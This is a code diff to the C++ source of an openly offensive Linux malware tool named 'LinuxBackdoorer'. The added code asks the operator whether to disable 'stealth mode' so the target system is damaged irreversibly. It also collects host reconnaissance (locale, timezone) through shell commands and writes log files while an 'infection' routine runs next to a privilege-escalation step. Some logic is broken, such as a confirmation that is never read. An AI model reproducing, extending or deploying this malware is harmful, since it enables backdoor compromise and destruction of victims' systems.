@@ -55,6 +55,28 @@ void Infection::askForPrivilegeEscalation(){
 	}	
 }
 
+bool Infection::askForNoStealthMode(){
+	std::string answer2StealthMode{""};
+	while(true){
+		printf("[+] Would you like to disable Stealth Mode and really F#!$ your target system ?");
+		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
+		std::cin >> answer2StealthMode;
+		if(answer2StealthMode == "YES" || answer2StealthMode == "NO" || answer2StealthMode == "Y" || answer2StealthMode == "N" || answer2StealthMode == "yes" || answer2StealthMode == "no" || answer2StealthMode == "y" || answer2StealthMode == "n"){
+			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
+				std::string confirm{""};
+				printf("[+] Stealth Mode Disabled, the system is going to be fucked !\n");
+				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : ");
+				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
+					return stealthEnabled = false;
+				}					
+			}		
+		} else if(answer2StealthMode == "NO" || answer2StealthMode == "no" || answer2StealthMode == "n" || answer2StealthMode == "N"){
+			printf("[+] Stealth Mode Enabled, *shhhhhh*");
+			return stealthEnabled = true;
+		}
+	}
+}
+
 void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE){
 	char buffer[2055];
 	FILE *command = popen(commandToRun, "r");
@@ -115,6 +137,12 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 				printf("[-] Apache not found on the system !");
 				isApache2Present = false;
 			}
+		} else if(vOutput == "localeLanguage"){
+			localLanguage = buffer;
+			printf("%s %s", successMessage, buffer);
+		} else if(vOutput == "timezone"){
+			localTimeZone = buffer;
+			printf("%s %s", successMessage, buffer);
 		} else {
 			printf("%s %s", successMessage, buffer);
 		}
@@ -135,6 +163,13 @@ void Infection::GetLinuxVersion(){
 	const char* kernelReleaseErrorMessage = "[-] Failed to obtain Kernel Release";
 	const char* kernelReleaseSuccessMessage = "[+] Kernel Release :";
 	runLocalCommand("uname -r", kernelReleaseErrorMessage, kernelReleaseSuccessMessage, "KernelRelease");
+	//Locale Language on the system
+	const char* localLangErrorMessage = "[+] Can't retrieve System Local Language";
+	const char* localLangSuccessMessage = "[+] System Local Language :";
+	runLocalCommand("localectl | grep System | cut -d ' ' -f6 | cut -d '=' -f2", localLangErrorMessage, localLangSuccessMessage, "localeLanguage");
+	const char* timeZoneErrorMessage = "[+] Can't retrieve Timezone";
+	const char* timeZoneSuccessMessage = "[+] Timezone :";
+	runLocalCommand("cat /etc/timezone", timeZoneErrorMessage, timeZoneSuccessMessage, "timezone");
 	//KernelVersion [Kind of useless right now]
 	//const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
 	//const char* kernelFullSuccessMessage = "[+] Kernel Version :";
@@ -165,6 +200,11 @@ bool Infection::startInfection(){
 	//GetLinuxVersion
 	FileInformations passwd;
 	passwd = Infection::GetFileInformations("LinuxBackdoorer");
+	if(std::experimental::filesystem::exists("logs.txt")){
+		Infection::log2File("logs.txt", *user + " added content to log file.");
+	} else {
+		Infection::log2File("logs.txt", *user + " created log file.");
+	}
 	Infection::write2File("TEST.txt", "I am making tests BOW !");
 	Infection::askForPrivilegeEscalation();
 	printf("[+] Get Linux Version");
